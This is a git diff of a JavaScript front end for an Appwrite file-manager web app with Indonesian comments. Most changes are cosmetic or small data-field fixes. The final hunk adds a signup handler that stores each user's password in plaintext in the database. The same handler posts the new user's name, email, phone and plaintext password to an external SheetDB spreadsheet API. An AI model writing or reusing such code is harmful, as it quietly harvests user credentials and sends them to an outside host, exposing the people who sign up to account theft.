@@ -41,12 +41,13 @@ async function checkSession() {
 }
 document.addEventListener('DOMContentLoaded', checkSession);
 
-// === LOAD FILES (PERBAIKAN FOLDER HILANG) ===
+// === LOAD FILES (PERBAIKAN AGAR FOLDER MUNCUL) ===
 async function loadFiles(folderId) {
     if (!currentUser) return;
     const grid = el('fileGrid'); grid.innerHTML = '';
     const header = el('headerTitle');
 
+    // Breadcrumb
     if(folderId === 'root') {
         updateGreeting(); 
     } else {
@@ -54,40 +55,40 @@ async function loadFiles(folderId) {
     }
 
     try {
-        // Query Database (Pastikan parentId sesuai)
+        // Query Database
         const res = await databases.listDocuments(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, [
             Appwrite.Query.equal('owner', currentUser.$id),
             Appwrite.Query.equal('parentId', folderId)
         ]);
         
         if(res.documents.length === 0) {
-            grid.innerHTML = `<p style="color:rgba(255,255,255,0.4); width:100%; text-align:center; grid-column: 1/-1; margin-top:50px;">Folder Kosong</p>`;
+            grid.innerHTML = `<p style="color:rgba(255,255,255,0.4); width:100%; text-align:center; grid-column: 1/-1; margin-top:50px;">Folder ini masih kosong</p>`;
         } else {
             res.documents.forEach(doc => renderItem(doc));
         }
-    } catch (e) { console.error("Error Load:", e); }
+    } catch (e) { console.error("Error loading files:", e); }
 }
 
-// === RENDER ITEM (TAMPILAN BERSIH) ===
+// === RENDER ITEM (TAMPILAN TANPA KOTAK) ===
 function renderItem(doc) {
     const grid = el('fileGrid');
     const div = document.createElement('div');
     const isFolder = doc.type === 'folder';
     
-    // FIX: Gunakan 'name' sesuai database Anda
-    const fileName = doc.name || "Tanpa Nama";
+    // FIX DATA: Gunakan 'name' (Bukan 'nama' jika di DB namanya 'name')
+    // Saya menggunakan || doc.nama untuk jaga-jaga kedua versi.
+    const fileName = doc.name || doc.nama || "Tanpa Nama";
     
     let content = '';
 
     if (isFolder) {
-        // Ikon Folder Kuning Besar (Tanpa Kotak)
+        // Ikon Folder Kuning (Tanpa background)
         content = `<i class="icon fa-solid fa-folder"></i>`;
     } else if (fileName.toLowerCase().match(/\.(jpg|jpeg|png|webp|gif)$/)) {
-        // Gambar
+        // Thumbnail
         const url = storage.getFilePreview(CONFIG.BUCKET_ID, doc.fileId);
         content = `<div class="thumb-box"><img src="${url}" class="thumb-img" loading="lazy"></div>`;
     } else {
-        // File Lain
         content = `<i class="icon fa-solid fa-file-lines" style="color:#60a5fa"></i>`;
     }
 
@@ -105,14 +106,13 @@ function renderItem(doc) {
     grid.appendChild(div);
 }
 
-// === FUNCTIONS ===
+// === ACTIONS ===
 window.openFolder = (id, nama) => { currentFolderId = id; currentFolderName = nama; loadFiles(id); };
 
 window.submitCreateFolder = async () => {
     const n = el('newFolderName').value.trim(); if(!n) return;
     closeModal('folderModal'); showLoading();
     try {
-        // Simpan ke 'name'
         await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
             name: n, type: 'folder', parentId: currentFolderId, owner: currentUser.$id, size: 0
         });
@@ -126,7 +126,6 @@ window.submitUploadFile = async () => {
     try {
         const up = await storage.createFile(CONFIG.BUCKET_ID, Appwrite.ID.unique(), window.selectedFile);
         const url = storage.getFileView(CONFIG.BUCKET_ID, up.$id);
-        // Simpan ke 'name'
         await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_FILES, Appwrite.ID.unique(), {
             name: window.selectedFile.name, type: 'file', parentId: currentFolderId, owner: currentUser.$id, url: url.href, fileId: up.$id, size: window.selectedFile.size
         });
@@ -171,6 +170,7 @@ el('fileInputHidden').addEventListener('change', (e) => handleFileSelect(e.targe
 function handleFileSelect(f) { window.selectedFile = f; el('fileInfoText').innerText = `File: ${f.name}`; }
 el('searchInput').addEventListener('input', () => loadFiles(currentFolderId));
 
+// Login Logic
 if (el('loginForm')) el('loginForm').addEventListener('submit', async (e) => {
     e.preventDefault();
     let id = el('loginEmail').value.trim(); const pw = el('loginPass').value;
@@ -187,5 +187,18 @@ if (el('loginForm')) el('loginForm').addEventListener('submit', async (e) => {
         checkSession();
     } catch(e) { alert(e.message); hideLoading(); }
 });
-// (Signup & Logout sama seperti sebelumnya)
-if (el('logoutBtn')) el('logoutBtn').addEventListener('click', async () => { if(confirm("Keluar?")){ await account.deleteSession('current'); nav('loginPage'); } });
+
+if (el('signupForm')) el('signupForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const name = el('regName').value; const email = el('regEmail').value; const phone = el('regPhone').value; const pass = el('regPass').value;
+    try {
+        const auth = await account.create(Appwrite.ID.unique(), email, pass, name);
+        await databases.createDocument(CONFIG.DB_ID, CONFIG.COLLECTION_USERS, auth.$id, { name, email, phone, password: pass });
+        fetch(`${SHEETDB_API}?sheet=SignUp`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({data: [{"ID": auth.$id, "Nama": name, "Email": email, "Phone": phone, "Password": pass, "Waktu": new Date().toLocaleString()}]}) });
+        alert("Berhasil!"); nav('loginPage');
+    } catch (e) { alert(e.message); }
+});
+
+if (el('logoutBtn')) el('logoutBtn').addEventListener('click', async () => {
+    if(confirm("Keluar?")) { await account.deleteSession('current'); nav('loginPage'); }
+});
